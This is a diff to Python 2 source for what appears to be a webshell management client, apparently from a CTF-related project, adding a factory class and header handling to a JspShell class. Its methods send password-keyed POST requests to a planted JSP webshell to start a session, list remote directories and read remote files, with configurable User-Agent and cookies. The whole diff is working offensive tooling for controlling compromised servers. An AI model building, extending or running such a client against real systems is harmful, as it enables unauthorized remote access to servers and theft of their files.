@@ -11,12 +11,29 @@ import config
 
 import sys
 
-sys.path.append("C:\Users\laochao\Desktop\CTF\SourceCode\YNM3000\src")
+sys.path.append("..")
+
+from entity import *
+from dbHelper import DatabaseHelper
+
+class ShellTools:
+
+    def __init__(self):
+        pass
+
+    @staticmethod
+    def getShellTools(shellEntity):
+        if shellEntity.shell_script_type=='JSP':
+            return JspShell(shellEntity)
 
 class JspShell:
 
     def __init__(self,shellEntity):
         self.shellEntity=shellEntity
+        self.httpSettingEntity=DatabaseHelper.getHttpSettingEntityByShellID(shellEntity.shell_id)
+        if not self.httpSettingEntity:
+            self.httpSettingEntity=HttpSettingEntity(config.HTTP_DEFAULT_COOKIE,config.HTTP_DEFAULT_UA)
+        self.httpHeaders={'User-Agent': self.httpSettingEntity.user_agent,'Cookie':self.httpSettingEntity.cookie}
 
     def parseResponse(self,response):
         if config.SPLIT_SYMBOL_LEFT in response and config.SPLIT_SYMBOL_RIGHT in response:
@@ -25,19 +42,16 @@ class JspShell:
             return 'Error://no symbol'
 
     def getStart(self):
-        payload = {self.shellEntity.shell_password: 'A'}
-        r=requests.post(self.shellEntity.shell_address,payload)
-        print r.text
+        payload = {self.shellEntity.shell_password: 'A','z0':self.shellEntity.shell_encode_type}
+        r=requests.post(self.shellEntity.shell_address,headers=self.httpHeaders,data=payload)
         return self.parseResponse(r.text)
 
     def getDirectoryContent(self,path):
-        payload = {self.shellEntity.shell_password: 'B','z1':path}
-        r = requests.post(self.shellEntity.shell_address, payload)
-        print r.text
+        payload = {self.shellEntity.shell_password: 'B','z1':path,'z0':self.shellEntity.shell_encode_type}
+        r = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
         return self.parseResponse(r.text)
 
     def getFileContent(self,path):
-        payload = {self.shellEntity.shell_password: 'C', 'z1': path}
-        r = requests.post(self.shellEntity.shell_address, payload)
-        print r.text
+        payload = {self.shellEntity.shell_password: 'C', 'z1': path,'z0':self.shellEntity.shell_encode_type}
+        r = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
         return self.parseResponse(r.text)
